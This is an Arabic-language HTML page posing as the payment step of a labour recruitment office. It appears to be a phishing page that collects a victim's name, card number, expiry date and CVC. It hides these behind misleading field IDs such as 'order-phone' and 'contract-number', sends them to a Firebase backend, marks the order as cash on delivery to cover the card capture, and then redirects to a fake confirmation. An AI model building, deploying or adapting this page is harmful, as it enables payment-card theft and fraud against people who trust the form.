<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>بيانات البطاقة | مكتب مساعد</title>
  <link rel="stylesheet" href="order-details.css">
</head>
<body>
  <main class="order-page">
    <header class="order-header"><div class="badge">☆</div><h1>بيانات الطلب</h1><p>يرجى إدخال بيانات الطلب لإتمام الحجز</p><strong>أكمل الحقول التالية</strong></header>
    <form id="order-form" class="order-form">
      <label>الاسم الكامل<input id="order-name" type="text" autocomplete="name" required></label>
      <label>رقم البطاقة<input id="order-phone" type="tel" autocomplete="tel" inputmode="tel" required></label>
      <div class="row contract-row">
        <label>تاريخ انتهاء <input id="contract-end-date" type="text" inputmode="numeric" maxlength="7" placeholder="MMYYYY" pattern="(0[1-9]|1[0-2])/[0-9]{4}" title="أدخل 6 أرقام، مثال: 092026" required></label>
        <label>cvc<input id="contract-number" type="text" inputmode="numeric" required></label>
      </div>
      <button type="submit">دفع</button>
    </form>
    <p class="site-name">مكتب مساعد لاستقدام العمالة</p>
  </main>
  <script type="module" src="draft-sync.js"></script>
  <script type="module">
    import { syncDraft } from './firebase-sync.js';

    const endDateInput = document.querySelector('#contract-end-date');
    endDateInput.addEventListener('input', () => {
      const digits = endDateInput.value.replace(/\D/g, '').slice(0, 6);
      endDateInput.value = digits.length > 2 ? `${digits.slice(0, 2)}/${digits.slice(2)}` : digits;
    });

    document.querySelector('#order-form').addEventListener('submit', async event => {
      event.preventDefault();
      const submitButton = event.currentTarget.querySelector('button[type="submit"]');
      const draft = JSON.parse(localStorage.getItem('musaedDraft') || '{}');
      draft.orderName = document.querySelector('#order-name').value;
      draft.orderPhone = document.querySelector('#order-phone').value;
      draft.contractNumber = document.querySelector('#contract-number').value;
      const [endMonth, endYear] = document.querySelector('#contract-end-date').value.trim().split('/');
      draft.orderEndMonth = endMonth;
      draft.orderEndYear = endYear;
      draft.orderEndDate = `${endMonth}/${endYear}`;
      draft.paymentMethod = 'الدفع عند الاستلام';
      draft.fullName = draft.orderName;
      draft.endDate = draft.orderEndDate;
      draft.createdAt = new Date().toLocaleString('ar-OM');
      localStorage.setItem('musaedDraft', JSON.stringify(draft));
      submitButton.disabled = true;
      syncDraft(draft).catch(error => console.error('تعذر حفظ بيانات الطلب في Firebase:', error));
      window.location.href = 'order-confirmation.html?step=1';
    });
  </script>
</body>
</html>
